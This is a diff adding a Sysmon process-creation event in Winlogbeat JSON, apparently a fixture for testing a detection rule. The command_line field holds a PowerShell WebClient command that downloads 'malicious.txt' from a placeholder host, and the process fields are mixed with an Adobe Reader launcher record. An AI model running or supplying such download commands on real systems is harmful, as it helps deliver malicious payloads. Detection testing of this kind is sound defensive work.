@@ -1,0 +1,134 @@
+{
+  "@timestamp": "2021-02-04T22:28:15.312Z",
+  "process": {
+    "entity_id": "{19FC45AC-74FF-601C-0000-00109F860200}",
+    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "working_directory": "C:\\Windows\\system32\\",
+    "name": "reader_sl.exe",
+    "pid": 2076,
+    "command_line": "powershell.exe -C (New-Object System.Net.Webclient).DownloadFile(remote.url/malicious.txt, output.txt)",
+    "parent": {
+      "command_line": "C:\\Windows\\Explorer.EXE",
+      "name": "explorer.exe",
+      "args": [
+        "C:\\Windows\\Explorer.EXE"
+      ],
+      "entity_id": "{19FC45AC-74FE-601C-0000-0010D8530200}",
+      "pid": 1572,
+      "executable": "C:\\Windows\\explorer.exe"
+    },
+    "args": [
+      "C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe"
+    ],
+    "hash": {
+      "md5": "452fa961163ef4aee4815796a13ab2cf",
+      "sha256": "14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7"
+    }
+  },
+  "hash": {
+    "md5": "452fa961163ef4aee4815796a13ab2cf",
+    "sha256": "14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7"
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:28:15.312\nProcessGuid: {19FC45AC-74FF-601C-0000-00109F860200}\nProcessId: 2076\nImage: C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe\nFileVersion: 9.1.0.2009022700\nDescription: Adobe Acrobat SpeedLauncher\nProduct: Adobe Acrobat\nCompany: Adobe Systems Incorporated\nOriginalFileName: AcroSpeedLaunch.exe\nCommandLine: \"C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe\" \nCurrentDirectory: C:\\Windows\\system32\\\nUser: CLIENT3\\setup\nLogonGuid: {19FC45AC-74FE-601C-0000-0020FD380200}\nLogonId: 0x238fd\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=452FA961163EF4AEE4815796A13AB2CF,SHA256=14DC422082F96F5C21C41A5E5F6E8445547CC4B02B18F0A86A34669CA2CE18A7\nParentProcessGuid: {19FC45AC-74FE-601C-0000-0010D8530200}\nParentProcessId: 1572\nParentImage: C:\\Windows\\explorer.exe\nParentCommandLine: C:\\Windows\\Explorer.EXE",
+  "winlog": {
+    "user": {
+      "type": "User",
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM",
+      "domain": "NT AUTHORITY"
+    },
+    "event_data": {
+      "Description": "Adobe Acrobat SpeedLauncher",
+      "Company": "Adobe Systems Incorporated",
+      "IntegrityLevel": "High",
+      "OriginalFileName": "AcroSpeedLaunch.exe",
+      "FileVersion": "9.1.0.2009022700",
+      "TerminalSessionId": "1",
+      "Product": "Adobe Acrobat",
+      "LogonId": "0x238fd",
+      "LogonGuid": "{19FC45AC-74FE-601C-0000-0020FD380200}"
+    },
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "event_id": 1,
+    "computer_name": "CLIENT3",
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "opcode": "Info",
+    "version": 5,
+    "record_id": 1233,
+    "process": {
+      "pid": 1516,
+      "thread": {
+        "id": 1780
+      }
+    },
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "task": "Process Create (rule: ProcessCreate)",
+    "api": "wineventlog"
+  },
+  "host": {
+    "hostname": "CLIENT3",
+    "architecture": "x86",
+    "os": {
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0",
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.103",
+      "172.16.1.3",
+      "fe80::5efe:c0a8:3867",
+      "fe80::5efe:ac10:103"
+    ],
+    "mac": [
+      "00:50:56:00:03:03",
+      "00:50:56:00:00:03",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ],
+    "name": "CLIENT3"
+  },
+  "log": {
+    "level": "information"
+  },
+  "event": {
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:31:13.052Z",
+    "module": "sysmon",
+    "type": [
+      "start",
+      "process_start"
+    ],
+    "category": [
+      "process"
+    ],
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon"
+  },
+  "user": {
+    "domain": "CLIENT3",
+    "name": "setup"
+  },
+  "related": {
+    "hash": [
+      "452fa961163ef4aee4815796a13ab2cf",
+      "14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7"
+    ],
+    "user": "setup"
+  },
+  "agent": {
+    "ephemeral_id": "f5ed3d9b-1471-4589-bd70-28219e0f5978",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT3",
+    "type": "winlogbeat",
+    "version": "7.10.2",
+    "hostname": "CLIENT3"
+  }
+}
